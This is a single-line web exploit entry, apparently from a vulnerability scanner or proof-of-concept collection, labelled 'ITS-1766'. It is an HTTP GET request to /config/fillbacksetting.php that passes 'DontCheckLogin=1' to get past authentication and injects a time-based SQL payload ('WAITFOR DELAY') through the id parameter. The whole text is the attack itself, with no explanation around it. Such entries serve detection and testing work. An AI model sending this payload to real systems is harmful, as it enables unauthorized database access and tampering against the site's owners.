# Vulnerable: ITS-1766
GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:6'--
